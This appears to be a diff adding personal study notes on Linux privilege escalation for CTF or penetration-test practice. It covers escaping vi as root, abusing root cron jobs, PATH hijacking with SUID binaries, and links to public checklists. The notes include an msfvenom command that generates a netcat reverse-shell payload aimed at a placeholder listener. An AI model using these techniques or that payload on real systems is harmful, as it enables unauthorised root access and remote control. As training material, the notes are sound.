@@ -71,4 +71,37 @@ openssl passwd -1 -salt [salt] [password]
 username:passwordhash:0:0:root:/root:/bin/bash
 
 Escaping Vi Editor
--sudo -l: 
+-sudo -l: list
+-sudo vi: open vi as root
+:!sh - open a shell 
+
+Exploiting Crontab
+-cron daemon: long-running process that executes commands at specific dates and times
+-schedule activities either as one-time evens or recurring tasks
+cat /etc/crontab
+# = id
+m = minute
+h = hour
+dom = Day of month
+mon = month
+dow = Day of week
+user = what user the command will run as
+command = what command should be run
+Exploit: 
+-look for root privileges
+-local machine netcat listener: msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+-target machine run: cat /etc/crontab
+-find file to target copy file to the correct directory with the same name
+
+PATH
+-an environment variable in Linux and Unix-like OS
+-view path using = echo $PATH
+-Privesc: rewrite the PATH variable to a location  - so the SUID binary calls the system shell to run an executable
+-run with same privileges as owner of the SUID file
+
+Futher Learning:
+Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.
+https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+https://payatu.com/guide-linux-privilege-escalation
